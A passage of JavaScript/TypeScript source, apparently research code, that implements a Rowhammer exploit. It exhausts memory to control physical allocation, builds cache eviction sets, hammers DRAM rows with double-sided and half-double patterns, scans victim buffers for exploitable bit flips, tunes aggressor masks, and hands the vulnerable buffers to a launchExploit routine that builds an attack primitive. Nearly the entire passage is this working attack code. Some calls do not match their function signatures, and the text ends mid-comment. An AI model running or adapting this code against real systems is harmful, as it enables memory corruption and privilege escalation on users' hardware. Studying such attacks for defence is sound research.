        timeInSeconds(performance.now(), firstTimeZero)
          .toFixed(0)
          .toString()
          .padStart(6, " ") +
        "," +
        DATA_PATTERN.toString(16) +
        "," +
        buf32[b].toString(16),
    );
  }

  assert(typeof buf32[b] === "number");
};

function fillRow(
  addr: number[],
  masks: number[],
  nestedBuffer: number[][],
  bufIdxs: number[],
  bs: BankStats,
) {
  const [h, pfn, px, p] = addr;

  if (h === -1) return;

  /* Just works if the PFN is zero! */
  const row = bs.ptoro((pfn << 12) + p);
  const bank = bs.ptoba((pfn << 12) + p);
  const idx = h * bufsPerSlab + slabOffsetToBuf(p);

  /* Addresses is bigger: bufIdxs is just this particular pattern */
  if (!bufIdxs.includes(idx)) {
    return;
  }

  if (nestedBuffer[idx] === undefined) {
    print("undefined idx", idx, h);
    return;
  }

  const CHECK_NEIGHBOURS: number = 0;

  for (let z = -1 * CHECK_NEIGHBOURS; z <= CHECK_NEIGHBOURS; z++) {
    let phys = (pfn << 12) + z * bufSize * bufsPerSlab;

    for (let i = 0; i < bufsPerSlab; i++) {
      let slab = h + z;
      let j = slab * bufsPerSlab + i;

      for (let k = 0; k < nestedBuffer[j].length; k += 2) {
        for (let l = 0; l < 2; l++) {
          let q = i * bufSize + (k + l) * 4;
          assert(q % 4 === 0);

          if (bs.ptoro(phys + q) === row && bs.ptoba(phys + q) === bank) {
            nestedBuffer[j][k + l] = masks[(k + l) % NUM_MASKS];
          }
        }
      }
    }
  }
}

function preCheckFlush() {
  let r: number = getRandomInt(0, 256);
  for (let i = 0; i < flushBuffer.length; i++) {
    flushBuffer[i] = i ^ r;
  }
}

function checkOrSet(
  bufIdxs: number[],
  nestedBuffer: number[][],
  check: boolean,
  doNotMaskOffsets: number[],
) {
  const CHECK_NEIGHBOURS: number = 1;

  let slabIdxs: number[] = bufIdxs.map((x) => Math.floor(x / bufsPerSlab));

  slabIdxs = [...new Set(slabIdxs)].sort((a, b) => a - b);

  print("will check slabs", slabIdxs);

  if (check) {
    print("check...");
    /* "Flushing" the victims */
    preCheckFlush();
  } else {
    print("set...");
    assert(!doNotMaskOffsets.length);
  }

  /*
   * We need a flip in the upper part of 64-bits: 0xfff800000....
   *
   * Little-endian:
   */
  let zeroOneMask = 0;
  let hadOneZero = false;
  let vulnerableBufferIdxs: number[] = [];
  let unwanted = 0;

  /* One mask per page offset */
  let masks = new Uint32Array(NUM_MASKS).map((x) => DATA_PATTERN ^ 0xffffffff);

  for (const idx of slabIdxs) {
    for (let z = -1 * CHECK_NEIGHBOURS; z <= CHECK_NEIGHBOURS; z++) {
      let slab = idx + z;

      if (!(slab >= 0 && slab < nestedBuffer.length / bufsPerSlab)) continue;

      for (let i = 0; i < bufsPerSlab; i++) {
        let j = slab * bufsPerSlab + i;

        assert(nestedBuffer[j].length % NUM_MASKS === 0);

        for (let k = 0; k < nestedBuffer[j].length; k += 2) {
          for (let l = 0; l < 2; l++) {
            if (!check) {
              /* Set */
              nestedBuffer[j][k + l] = DATA_PATTERN;
            } else if (
              /* Check */
              check &&
              nestedBuffer[j][k + l] != DATA_PATTERN &&
              nestedBuffer[j][k + l] != (DATA_PATTERN ^ 0xffffffff) >>> 0 &&
              nzb((nestedBuffer[j][k + l] ^ DATA_PATTERN) >>> 0) <= 3
            ) {
              const maskIdx = (k + l) % NUM_MASKS;

              print(
                "csv:flp,",
                timeInSeconds(performance.now(), firstTimeZero)
                  .toFixed(0)
                  .toString()
                  .padStart(6, " "),
                DATA_PATTERN.toString(16),
                nestedBuffer[j][k + l].toString(16),
                slab,
                j,
                k,
                l,
                maskIdx,
              );

              let flip: number = (nestedBuffer[j][k + l] ^ DATA_PATTERN) >>> 0;

              assert(nzb(flip) >= 1);

              /* Skipping these, rare, might give trouble */
              if (nzb(flip) > 1) continue;

              /* Bigger now, so zero to one */
              let zeroToOne: boolean =
                nestedBuffer[j][k + l] > DATA_PATTERN ? true : false;

              print(
                "flip",
                flip.toString(16).padStart(8, "0"),
                zeroToOne ? "0 -> 1" : "1 -> 0",
              );

              const maskFlip = (): void => {
                masks[maskIdx] = zeroToOne
                  ? masks[maskIdx] & ~flip
                  : masks[maskIdx] | flip;
              };

              if (l === 0 || !(flip & EXPLOITABLE_MASK32)) {
                if (!doNotMaskOffsets.includes(maskIdx)) {
                  print("updating mask with idx", maskIdx);
                  maskFlip();
                }

                unwanted++;
              } else if (l === 1 && flip & EXPLOITABLE_MASK32) {
                print("exploitable");

                if (zeroToOne && !zeroOneMask) {
                  zeroOneMask = flip >>> 16;

                  doNotMaskOffsets.push(maskIdx);
                  vulnerableBufferIdxs.push(j);

                  assert((DATA_PATTERN ^ 0xffffffff) & (zeroOneMask << 16));
                  assert(
                    (masks[maskIdx] & EXPLOITABLE_MASK32) ===
                      ((DATA_PATTERN ^ 0xffffffff) & EXPLOITABLE_MASK32),
                  );

                  print("0 -> 1 (2nd)", zeroOneMask.toString(16), j);
                } else if (!zeroToOne) {
                  hadOneZero = true;

                  doNotMaskOffsets.push(maskIdx);
                  vulnerableBufferIdxs.push(j);

                  assert(
                    !((DATA_PATTERN ^ 0xffffffff) & ((flip >>> 16) << 16)),
                  );
                  assert(
                    (masks[maskIdx] & EXPLOITABLE_MASK32) ===
                      ((DATA_PATTERN ^ 0xffffffff) & EXPLOITABLE_MASK32),
                  );

                  print("1 -> 0 (1st)", j);
                }
              }

              /* Restore to avoid assertions failing when reinstalling */
              nestedBuffer[j][k + l] = DATA_PATTERN;
            }
          }
        }
      }
    }
  }

  print("final", vulnerableBufferIdxs, zeroOneMask.toString(16));

  if (zeroOneMask && hadOneZero) {
    assert(vulnerableBufferIdxs.length);

    return {
      /* The ones we want */
      zeroOneMask: zeroOneMask,
      bufs: vulnerableBufferIdxs,
      doNotMaskOffsets: doNotMaskOffsets,
      aggressorMasks: masks,
      unwanted: unwanted,
    };
  } else {
    return {
      /* What we don't want */
      zeroOneMask: 0,
      bufs: vulnerableBufferIdxs,
      doNotMaskOffsets: [],
      aggressorMasks: masks,
      unwanted: unwanted,
    };
  }
}

function debugPacked(x: number, matches: number[], bs: BankStats, i: number) {
  let h = Math.floor((x >>> 14) / bufsPerSlab);
  let p = ((x >>> 14) % bufsPerSlab) * bufSize + ((x & 0x3fff) << 2);

  const [b, s, pfn] = matches[h];

  print(
    i,
    h,
    p,
    x.toString(16),
    bs.ptoba((pfn << 12) + p),
    bs.ptoro((pfn << 12) + p),
  );
}

function launchExploit(
  hammer: (xors: number, refIters: number[], amp: number) => number,
  spec,
  vulnerableBufferIdxs: number[],
  nestedBuffer: number[][],
  pfn: number,
) {
  const placeHolder = new Uint32Array(new ArrayBuffer(bufSize));

  /*
   * Release the vulnerable buffers. Replace to preserver nestedBuffer's layout
   */
  for (const idx of vulnerableBufferIdxs) {
    nestedBuffer.splice(idx, 1, placeHolder);
  }

  bufPlaza = null;
  bufPlaza32 = null;
  gc();

  sleep(1);

  buildPrimitive(hammer, spec);
}

function setsToDoubleMB(
  pairs: EvictionSet[],
  ratio: number,
  expansion: number,
  assemblies: number[],
  nonUniformities: number[],
  tREFIs: number,
  nestedBuffer: number[][],
  bs: BankStats,
  li: LLCInfo,
  matches: number[],
) {
  /* Exactly: two pairs (so 4 eviction sets!) */
  assert(pairs.length === 2);
  assert(ratio > 1);

  const repsPerREFs: number[] = [
    MIN_REPS_PER_REF,
    MIN_REPS_PER_REF * ratio,
  ].map((x) => x * expansion);

  let success: boolean = true;

  pairs.forEach((pair, i) =>
    pair.sets.forEach((set) => {
      set.newIterableMB(assemblies[i], 16, nonUniformities[i], matches, bs);
      success =
        success &&
        set.installMB([DATA_PATTERN, DATA_PATTERN ^ 0xffffffff], nestedBuffer);
    }),
  );

  if (!success) return;

  const chaseLengths: number[] = pairs.map((pair) =>
    pair.sets.reduce((l, r) =>
      l.iter.length === r.iter.length ? r.iter.length : false,
    ),
  );

  let all: number[] = [];

  for (const [i, pair] of pairs.entries()) {
    for (const [j, set] of pair.sets.entries()) {
      for (const x of set.iter32) {
        all.push(x);
      }
    }
  }

  /*
   * Done in sync!
   * const refIters = repsPerREFs.map((r, i) => r * chaseLengths[i]);
   */
  const hammer = (xors: number, refIters: number[], amp: number): number => {
    /* Cool stuff: will include the pairs reference! Closure */
    let x: number;
    let y: number;
    let z: number;

    for (let i = 0; i < amp; i++) {
      for (z = 0; z < xors; z++) {
        z += z ^ z;
      }

      for (let p = 0; p < pairs.length; p++) {
        x = pairs[p].start;
        y = pairs[p].partner.start;

        /* Double */
        for (let j = 0; j < refIters[p]; j++) {
          x = nestedBuffer[(x >>> 14) & 0x3ffff][x & 0x3fff];
          y = nestedBuffer[(y >>> 14) & 0x3ffff][y & 0x3fff];
        }
      }
    }

    return x ^ y ^ z;
  };

  const hammerDebug = (
    xors: number,
    refIters: number[],
    amp: number,
  ): number => {
    /* Cool stuff: will include the pairs reference! Closure */
    let x: number;
    let y: number;
    let z: number;

    for (let i = 0; i < amp; i++) {
      for (z = 0; z < xors; z++) {
        z += z ^ z;
      }

      for (let p = 0; p < pairs.length; p++) {
        x = pairs[p].start;
        y = pairs[p].partner.start;

        /* Double */
        for (let j = 0; j < refIters[p]; j++) {
          x = nestedBuffer[(x >>> 14) & 0x3ffff][x & 0x3fff];
          debugPacked(x, matches, bs, j);
          assert(all.includes(x));
          /* TODO: add assertion here (is x in iter32) */
          y = nestedBuffer[(y >>> 14) & 0x3ffff][y & 0x3fff];
          debugPacked(y, matches, bs, j);
          assert(all.includes(y));
        }
      }

      break;
    }

    return x ^ y ^ z;
  };

  let s = sync(hammer, chaseLengths, repsPerREFs, tREFIs);

  if (s === null) {
    print("aborting...");
    pairs.forEach((pair) =>
      pair.sets.forEach((set) => {
        set.clearMB(DATA_PATTERN, nestedBuffer);
      }),
    );
    return;
  }

  print(
    "csv:pat,d," +
      timeInSeconds(performance.now(), firstTimeZero)
        .toFixed(0)
        .toString()
        .padStart(6, " ") +
      "," +
      assemblies
        .map((x) => x.toString(16).padStart(4, "0"))
        .reduce((l, r) => l + "/" + r) +
      "," +
      __pfst(tREFIs, 0, 2) +
      "," +
      s.repsPerREFs.map((x) => __pfst(x, 0, 3)).reduce((l, r) => l + "/" + r) +
      "," +
      __pfst(nonUniformities[0], 0, 1) +
      "," +
      __pfst(nonUniformities[1], 0, 1) +
      "," +
      __pfst(s.xors, 0, 5) +
      "," +
      __pfst(ratio, 0, 1) +
      "," +
      __pfst(expansion, 0, 1),
  );

  /*
   * First: let get the bufs we need to check
   */
  let bufIdxs: number[] = [];
  pairs.forEach((pair) =>
    pair.sets.forEach((set) => (bufIdxs = bufIdxs.concat(set.bufIdxs))),
  );
  bufIdxs = [...new Set(bufIdxs)].sort((a, b) => a - b);

  let bufIdxsIndirect: number[] = [];
  pairs.forEach((pair) =>
    pair.sets.forEach(
      (set) => (bufIdxsIndirect = bufIdxsIndirect.concat(set.bufIdxsIndirect)),
    ),
  );
  bufIdxsIndirect = [...new Set(bufIdxsIndirect)].sort((a, b) => a - b);

  assert(new Set(bufIdxs).isSubsetOf(new Set(bufIdxsIndirect)));

  print("setting");
  checkOrSet(bufIdxs, nestedBuffer, false, []);

  pairs.forEach((pair) =>
    pair.sets.forEach((set) =>
      set.addrs.forEach((addr) => fillRow(addr, nestedBuffer, bufIdxs, bs)),
    ),
  );

  print("installing");
  /* Install it again... */
  pairs.forEach((pair, i) =>
    pair.sets.forEach((set) => {
      set.installMB([DATA_PATTERN, DATA_PATTERN ^ 0xffffffff], nestedBuffer);
    }),
  );

  const spec = {
    xors: s.xors,
    refIters: s.repsPerREFs.map((r, i) => r * chaseLengths[i]),
    amp: (4 * 8192) / tREFIs,
    pretend: PRETEND,
    zeroOneMask: 0x1000,
  };

  /* Write to the whole buffer: if there's an agg., skip, otherwise write
   * 0xaa */
  print("hammer...");
  dummy[0] ^= hammer(spec.xors, spec.refIters, spec.amp);

  /*
   * Was used for debugging: insert fake flip
   *
   * let fakeFlipBuffer = nestedBuffer[bufIdxs[getRandomInt(0, bufIdxs.length)]];
   * fakeFlipBuffer[getRandomInt(0, fakeFlipBuffer.length)] = 0x8aaa8a8a;
   */

  /* Need to run before uninstall! */
  dummy[0] ^= hammerDebug(
    s.xors,
    s.repsPerREFs.map((r, i) => r * chaseLengths[i]),
    (256 * 8192) / tREFIs,
  );

  print("clearing");
  /* Uninstall; and a nice way to avoid having to blacklist aggressors */
  pairs.forEach((pair) =>
    pair.sets.forEach((set) => {
      set.clearMB(DATA_PATTERN, nestedBuffer);
    }),
  );

  print("checking");
  let vulnerableBufferIdxs: number[] = checkOrSet(
    bufIdxs,
    nestedBuffer,
    true,
    [],
  );

  if (vulnerableBufferIdxs.length) {
    launchExploit(hammer, spec, vulnerableBufferIdxs, nestedBuffer);
  }
}

function setsToDouble(
  pairs: EvictionSet[],
  ratio: number,
  expansion: number,
  assemblies: number[],
  nonUniformities: number[],
  tREFIs: number,
  hugePageAtPages: number[],
  bs: BankStats,
  li: LLCInfo,
) {
  /* Exactly: two pairs */
  assert(pairs.length === 2);
  assert(ratio > 1);

  const repsPerREFs: number[] = [
    MIN_REPS_PER_REF,
    MIN_REPS_PER_REF * ratio,
  ].map((x) => x * expansion);

  pairs.forEach((pair, i) =>
    pair.sets.forEach((set) => {
      set.newIterable(assemblies[i], 16, nonUniformities[i]);
      set.install(DATA_PATTERN);
    }),
  );

  const chaseLengths: number[] = pairs.map((pair) =>
    pair.sets.reduce((l, r) =>
      l.iter.length === r.iter.length ? r.iter.length : false,
    ),
  );

  /*
   * Done in sync!
   * const refIters = repsPerREFs.map((r, i) => r * chaseLengths[i]);
   */

  const hammer = (xors: number, refIters: number[], amp: number): number => {
    /* Cool stuff: will include the pairs reference! Closure */
    let x: number;
    let y: number;
    let z: number;

    for (let i = 0; i < amp; i++) {
      for (z = 0; z < xors; z++) {
        z += z ^ z;
      }

      for (let p = 0; p < pairs.length; p++) {
        x = pairs[p].start;
        y = pairs[p].partner.start;

        /* Double */
        for (let j = 0; j < refIters[p]; j++) {
          x = buf32[x & buf32Bounds];
          y = buf32[y & buf32Bounds];
        }
      }
    }

    return x ^ y ^ z;
  };

  let s = sync(hammer, chaseLengths, repsPerREFs, tREFIs);

  if (s === null) {
    print("aborting...");
    pairs.forEach((pair) => pair.sets.forEach((set) => set.uninstall()));
    return;
  }

  print(
    "csv:pat,d," +
      timeInSeconds(performance.now(), firstTimeZero)
        .toFixed(0)
        .toString()
        .padStart(6, " ") +
      "," +
      assemblies
        .map((x) => x.toString(16).padStart(4, "0"))
        .reduce((l, r) => l + "/" + r) +
      "," +
      __pfst(tREFIs, 0, 2) +
      "," +
      s.repsPerREFs.map((x) => __pfst(x, 0, 3)).reduce((l, r) => l + "/" + r) +
      "," +
      __pfst(nonUniformities[0], 0, 1) +
      "," +
      __pfst(nonUniformities[1], 0, 1) +
      "," +
      __pfst(s.xors, 0, 5) +
      "," +
      __pfst(ratio, 0, 1) +
      "," +
      __pfst(expansion, 0, 1),
  );

  pairs.forEach((pair) =>
    bs.rowsDo(pair, setVictim, setAggressor, hugePageAtPages, li),
  );
  pairs.forEach((pair) => pair.sets.forEach((set) => set.install()));

  print("hammer...");
  dummy[0] ^= hammer(
    s.xors,
    s.repsPerREFs.map((r, i) => r * chaseLengths[i]),
    (256 * 8192) / tREFIs,
  );

  print("check...");
  pairs.forEach((pair) =>
    bs.rowsDo(pair, checkVictim, null, hugePageAtPages, li),
  );

  pairs.forEach((pair) => pair.sets.forEach((set) => set.uninstall()));
}

function setsToHMB(
  pair: EvictionSet,
  assembly: number,
  tREFIs: number,
  nonUniformity: number,
  nestedBuffer: number[][],
  bs: BankStats,
  li: LLCInfo,
  matches: number[],
) {
  assert(pair.partner);

  let repsPerREF = MIN_REPS_PER_REF;
  let success: boolean = true;

  /*
   * For debugging:
   * printAddresses(set.addrs, "", true, hugePageAtPages, bs, li);
   */
  pair.sets.forEach((set) => {
    set.newIterableMB(assembly, 16, nonUniformity, matches, bs);
    /* For debugging: set.newIterable(0x0, 16, nonUniformity) */
    success =
      success &&
      set.installMB([DATA_PATTERN, DATA_PATTERN ^ 0xffffffff], nestedBuffer);
  });

  if (!success) return;

  let chaseLength = pair.sets.reduce((l, r) =>
    l.iter.length === r.iter.length ? r.iter.length : false,
  );

  /*
   * For debugging, you could do:
   * bs.rowsDo(sets[0], printVictim, printAggressor, hugePageAtPages, li);
   */
  const hammer = (xors: number, refIters: number[], amp: number): number => {
    let x: number = pair.start;
    let y: number = pair.partner.start;

    let z: number = 0;

    for (let i = 0; i < amp; i++) {
      for (z = 0; z < xors; z++) {
        z += z ^ z;
      }

      for (let j = 0; j < refIters[0]; j++) {
        x = nestedBuffer[(x >>> 14) & 0x3ffff][x & 0x3fff];
        y = nestedBuffer[(y >>> 14) & 0x3ffff][y & 0x3fff];
      }
    }

    return x ^ y ^ z;
  };

  assert(chaseLength % 2 === 0);

  let s = sync(hammer, [chaseLength], [repsPerREF], tREFIs);

  if (s === null) {
    print("aborting...");
    pair.sets.forEach((set) => {
      set.clearMB(DATA_PATTERN, nestedBuffer);
    });
    return;
  }

  print(
    "csv:pat,h," +
      timeInSeconds(performance.now(), firstTimeZero)
        .toFixed(0)
        .toString()
        .padStart(6, " ") +
      "," +
      assembly.toString(16).padStart(4, "0") +
      "," +
      __pfst(tREFIs, 0, 2) +
      "," +
      __pfst(s.repsPerREFs[0], 0, 2) +
      "," +
      __pfst(nonUniformity, 0, 1) +
      "," +
      __pfst(s.xors, 0, 5),
  );

  let bufIdxs: number[] = [];
  pair.sets.forEach((set) => (bufIdxs = bufIdxs.concat(set.bufIdxs)));
  bufIdxs = [...new Set(bufIdxs)].sort((a, b) => a - b);

  let bufIdxsIndirect: number[] = [];
  pair.sets.forEach(
    (set) => (bufIdxsIndirect = bufIdxsIndirect.concat(set.bufIdxsIndirect)),
  );
  bufIdxsIndirect = [...new Set(bufIdxsIndirect)].sort((a, b) => a - b);

  assert(new Set(bufIdxs).isSubsetOf(new Set(bufIdxsIndirect)));

  print("setting");
  checkOrSet(bufIdxs, nestedBuffer, false, []);

  let aggressorMasks: number[] = new Uint32Array(NUM_MASKS).map(
    (x) => DATA_PATTERN ^ 0xffffffff,
  );

  pair.sets.forEach((set) =>
    set.addrs.forEach((addr) =>
      fillRow(addr, aggressorMasks, nestedBuffer, bufIdxs, bs),
    ),
  );

  print("installing");
  /* Install it again... */
  pair.sets.forEach((set) => {
    set.installMB([DATA_PATTERN, DATA_PATTERN ^ 0xffffffff], nestedBuffer);
  });

  print("entries");
  print("esx,", pair.sets[0].iter32);
  print("esy,", pair.sets[1].iter32);

  const spec = {
    xors: s.xors,
    refIters: [chaseLength * s.repsPerREFs[0]],
    amp: (256 * 8192) / tREFIs,
    pretend: false,
    zeroOneMask: 0,
    preHammer: null,
    postHammer: null,
  };

  print("hammer...", DATA_PATTERN.toString(16));
  dummy[0] ^= hammer(spec.xors, spec.refIters, spec.amp);

  /*
   * print("sleep");
   * sleep(1500);
   * sleep(1500);
   * sleep(1500);
   * sleep(1500);
   * sleep(1500);
   * sleep(1500);
   */

  print("clearing");
  /* Uninstall; and a nice way to avoid having to blacklist aggressors */
  pair.sets.forEach((set) => {
    set.clearMB(DATA_PATTERN, nestedBuffer);
  });

  print("checking");
  let check = checkOrSet(bufIdxs, nestedBuffer, true, []);

  if (check.zeroOneMask) {
    print("launching exploit");
    assert(check.bufs.length);

    const postHammer = (): void => {
      preCheckFlush();
    };

    spec.zeroOneMask = check.zeroOneMask;
    spec.postHammer = postHammer;

    aggressorMasks = check.aggressorMasks;

    let preHammer = null;
    let oldMasks = 0;
    let patience = 100;

    const INVERSE_DATA_PATTERN = (DATA_PATTERN ^ 0xffffffff) >>> 0;

    for (const [i, mask] of aggressorMasks.entries()) {
      if (mask !== INVERSE_DATA_PATTERN) {
        print(i, INVERSE_DATA_PATTERN.toString(16), mask.toString(16));
        oldMasks++;
      }
    }

    print(`starting with ${oldMasks} masks`);

    /* Starting at 10% for speed. Usually a safe bet */
    const HC = spec.amp;
    const MAX_UNWANTED = 5;

    while (patience) {
      preHammer = (): void => {
        pair.sets.forEach((set) =>
          set.addrs.forEach((addr) =>
            fillRow(addr, aggressorMasks, nestedBuffer, bufIdxs, bs),
          ),
        );
        pair.sets.forEach((set) => {
          set.installMB(aggressorMasks, nestedBuffer);
        });
      };

      spec.preHammer = preHammer;

      print("reproducing/testing mask", patience);
      const amp = Math.round(spec.amp - 0.2 * spec.amp);

      checkOrSet(bufIdxs, nestedBuffer, false, []);
      spec.preHammer();

      print("hammer...", Math.round(amp), Math.round((100 * amp) / HC), "%");
      dummy[0] ^= hammer(spec.xors, spec.refIters, amp);

      print("post...");
      postHammer();

      print("check...");
      pair.sets.forEach((set) => {
        set.clearMB(DATA_PATTERN, nestedBuffer);
      });

      const __check = checkOrSet(
        bufIdxs,
        nestedBuffer,
        true,
        check.doNotMaskOffsets,
      );

      /*
       * Strategy:
       * 1. Perfect? Try 10 more times. If they're all perfect, done
       * 2. Not perfect?
       *  2a: Got the flips we need. More patience
       *  2b: Didn't get them. Less patience
       * 3. Mask new flips. Unwanted bit flips but no new masks? Reduce HC
       */
      if (__check.zeroOneMask && __check.unwanted <= MAX_UNWANTED) {
        print("perfect!");
        /*
         * spec.amp = amp;
         * break;
         */
      }

      /* Apply both diffs to the original */
      aggressorMasks = aggressorMasks.map((x, i) => {
        if (__check.aggressorMasks[i] === x) {
          return x;
        } else {
          return (
            __check.aggressorMasks[i] ^
            INVERSE_DATA_PATTERN ^
            x ^
            INVERSE_DATA_PATTERN ^
            INVERSE_DATA_PATTERN
          );
        }
      });

      print("masks...");
      let masks = 0;

      for (const [i, mask] of aggressorMasks.entries()) {
        if (mask !== INVERSE_DATA_PATTERN) {
          print(i, INVERSE_DATA_PATTERN.toString(16), mask.toString(16));
          masks++;
        }
      }

      print("...");
      print(
        `${masks} in total, ${masks - oldMasks} are new, ${__check.unwanted} unwanted flips`,
      );

      print(
        `csv:hc,${amp},${__check.zeroOneMask},${__check.unwanted},${masks - oldMasks}`,
      );

      /* Had what we need, but also some unwanted that were already masked? */
      if (__check.zeroOneMask && __check.unwanted && masks - oldMasks === 0) {
        print("reducing HC");
        spec.amp = amp;
      }

      oldMasks = masks;
      patience--;
    }

    launchExploit(hammer, spec, check.bufs, nestedBuffer);
  }
}

function setsToH(
  pair: EvictionSet,
  assembly: number,
  tREFIs: number,
  nonUniformity: number,
  hugePageAtPages: number[],
  bs: BankStats,
  li: LLCInfo,
) {
  assert(pair.partner);

  let repsPerREF = MIN_REPS_PER_REF;
  let quatro = getRandomInt(0, 3) === 0 ? true : false;

  /*
   * For debugging:
   * printAddresses(set.addrs, "", true, hugePageAtPages, bs, li);
   */
  pair.sets.forEach((set) => {
    set.newIterable(assembly, 16, nonUniformity);
    /* For debugging: set.newIterable(0x0, 16, nonUniformity) */

    if (quatro) {
      set.install2(DATA_PATTERN);
    } else {
      set.install(DATA_PATTERN);
    }
  });

  let chaseLength = pair.sets.reduce((l, r) =>
    l.iter.length === r.iter.length ? r.iter.length : false,
  );

  /*
   * For debugging, you could do:
   * bs.rowsDo(sets[0], printVictim, printAggressor, hugePageAtPages, li);
   */
  const hammer = quatro
    ? (xors: number, refIters: number[], amp: number): number => {
        let xa: number = pair.iter32[0];
        let xb: number = pair.iter32[1];
        let xc: number = 0;

        let ya: number = pair.partner.iter32[0];
        let yb: number = pair.partner.iter32[1];
        let yc: number = 0;

        let z: number = 0;

        for (let i = 0; i < amp; i++) {
          for (z = 0; z < xors; z++) {
            z += z ^ z;
          }

          /* H */
          for (let j = 0; j < refIters[0]; j += 2) {
            xa = buf32[xa & buf32Bounds];
            ya = buf32[ya & buf32Bounds];
            xb = buf32[xb & buf32Bounds];
            yb = buf32[yb & buf32Bounds];

            xc = xa;
            xa = xb;
            xb = xc;

            yc = ya;
            ya = yb;
            yb = yc;
          }
        }

        return xa ^ xb ^ xc ^ ya ^ yb ^ yc ^ z;
      }
    : (xors: number, refIters: number[], amp: number): number => {
        let x: number = pair.start;
        let y: number = pair.partner.start;

        let z: number = 0;

        for (let i = 0; i < amp; i++) {
          for (z = 0; z < xors; z++) {
            z += z ^ z;
          }

          for (let j = 0; j < refIters[0]; j++) {
            x = buf32[x & buf32Bounds];
            y = buf32[y & buf32Bounds];
          }
        }

        return x ^ y ^ z;
      };

  assert(chaseLength % 2 === 0);

  let s = sync(hammer, [chaseLength], [repsPerREF], tREFIs);

  if (s === null) {
    print("aborting...");
    pair.sets.forEach((set) => set.uninstall());
    return;
  }

  print(
    "csv:pat,h," +
      timeInSeconds(performance.now(), firstTimeZero)
        .toFixed(0)
        .toString()
        .padStart(6, " ") +
      "," +
      assembly.toString(16).padStart(4, "0") +
      "," +
      __pfst(tREFIs, 0, 2) +
      "," +
      __pfst(s.repsPerREFs[0], 0, 2) +
      "," +
      __pfst(nonUniformity, 0, 1) +
      "," +
      __pfst(s.xors, 0, 5) +
      "," +
      quatro,
  );

  bs.rowsDo(pair, setVictim, setAggressor, hugePageAtPages, li);

  /* Reinstall! We wrote to the aggressor rows */
  pair.sets.forEach((set) => set.install());

  print("hammer...");
  dummy[0] ^= hammer(
    s.xors,
    [chaseLength * s.repsPerREFs[0]],
    (256 * 8192) / tREFIs,
  );

  print("check...");
  bs.rowsDo(pair, checkVictim, null, hugePageAtPages, li);

  pair.sets.forEach((set) => set.uninstall());
}

function rotateEvictionSet(es: EvictionSet, li: LLCInfo) {
  let testSet = new EvictionSet(li.wayness);

  es.addrs.map((x) => assert(x >= es.boundary * 4 * kb));

  /*
   * OK: we know there's nothing below the boundary
   */
  const applyMaskToAddress = (x, b, m) => ((x - b * 4 * kb) ^ m) + b * 4 * kb;

  let diffs: number[] = [];

  for (let s: number = 0; s < li.numSlices; s++) {
    for (let maskIdx: number = 0; maskIdx < 1 << 5; maskIdx++) {
      let mask: number = maskIdx << (li.numSetBits + NUM_LINE_BITS);

      testSet.addrs = [...es.addrs].map((x) =>
        applyMaskToAddress(x, es.boundary, mask),
      );

      let y = testSet.evicts([]);

      if (li.ptosl(mask) === s) {
        print(
          s,
          __pfst(maskIdx, 0, 2),
          mask.toString(2).padStart(32, " "),
          __pfst(y.median, 2, 4),
          __pfst(es.baseline, 2, 4),
        );

        if (y.median > 2 * es.baseline) {
          es.colors.push([...testSet.addrs]);
          break;
        }
      }
    }
  }

  print("Found colors: ", es.colors.length);
  assert(es.colors.length > 1);
}

function main(dimm: string) {
  const contents = os.file.readFile("../bank-functions/" + dimm + ".csv");
  const bankStats = new BankStats(contents);

  print(bankStats.bankFunctions);
  print(bankStats.rowMask);

  let llcInfo: LLCInfo;

  if (UARCH == UARCHS.KABY) {
    llcInfo = new LLCInfo(16, 8, 4, 10, sliceBitsKaby, getSliceKaby);
  } else if (UARCH == UARCHS.COFFEE) {
    /*
     * Coffee Lake i7-8700K has 12 slices instead of just 8 slices (Kaby Lake,
     * i7-7700K), see https:uops.info/cache.html. However, on CL we find  that
     * addresses only fall into six slices
     */
    llcInfo = new LLCInfo(16, 12, 4, 10, sliceBitsCoffee, getSliceCoffee);
  } else {
    assert(0);
  }

  print("Sleeping...");
  if (!RUSH) sleep(10);

  let bufParking = [];

  /*
   * Depends on the size of the DIMM
   */

  // const exhaustFirst = 6;
  // const exhaustFirst = 7;
  const exhaustFirst = 9; /* a2 */
  // const exhaustFirst = 3; [> a10 <]

  for (let i = 0; i < exhaustFirst; i++) {
    /*
     * This works: we get plenty of cont. memory. Problem is that its
     * unfree'able because it's one big array
     */
    buf8 = new Uint8Array(new ArrayBuffer(1 * gb));
    populate(buf8);
    bufParking.push(buf8);
    /* For ordering */
    print(`You should see ${i + 1}...`);
    if (!RUSH) sleep(1);
  }

  assert(bufParking.length == exhaustFirst);

  flushBuffer = new Uint8Array(new ArrayBuffer(32 * mb));

  gc(); /* TODO: remove? */
  print("Exhausted a few GBs... Will now allocate smaller buffers...");
  if (!RUSH) sleep(5);

  // const factor = 1;
  // const factor = 253;
  const factor = 14;

  assert(factor == 1 || factor == 14 || factor == 253 || factor == 252);
  assert(factor >= 252 || 252 % factor == 0);

  const smallBufSize = factor * (4 * kb);

  assert(smallBufSize === bufSize); /* TODO: make one variable */

  /* Because of how we compute @allocs */
  assert(factor === 14);

  const allocs = 9 * 1024 * (252 / factor); /* a2 */
  // const allocs = 3 * 1024 * (252 / factor);
  // const allocs = 4 * 1024 * (252 / factor); [> a10 <]
  const allocsPerBlock = factor >= 252 ? 1 : 252 / factor; /* 18 */

  const lastFew = allocs - 0 * allocsPerBlock;

  /* Used to be 20 or 50, now longer necessary now that we start at the back */
  const firstFew = 0 * allocsPerBlock;
  // const firstFew = 50 * allocsPerBlock;
  // const firstFew = 20 * allocsPerBlock;
  const release = false;

  let bufDummies = [];

  /* Need this to make sure the @allocs below are aligned. Crucial. Magic */
  for (let i = 0; i < allocsPerBlock - 1; i++) {
    var bufx: Uint8Array = new Uint8Array(new ArrayBuffer(smallBufSize));
    populate(bufx);
    bufDummies.push(bufx);
  }

  /* Should go until ~1036 */
  for (let i = 0; i < allocs; i++) {
    /*
     * We need these, the sleeping, to make sure in every pass over
     * /proc/pid/maps, we get just one new mapping, and it's the latest one.
     * For the large number of initial mappings, the order will not be
     * chronological, but rather order by virtual address, that's simply how
     * /proc/pid/maps works...
     *
     * Are they not contiguous? Make sure huge pages are enabled
     */
    if (i > lastFew || i < firstFew) {
      if (factor >= 252 || (factor < 252 && i % (1 * allocsPerBlock) == 0)) {
        if (i > lastFew) print(`Last ${allocs - i}...`);
        if (i < firstFew) print(`First ${i}/${allocsPerBlock}...`);
        sleep(3);
      }
    }

    buf9 = new Uint8Array(new ArrayBuffer(smallBufSize));
    populate(buf9);

    /*
     * Debugging suggestions:
     *
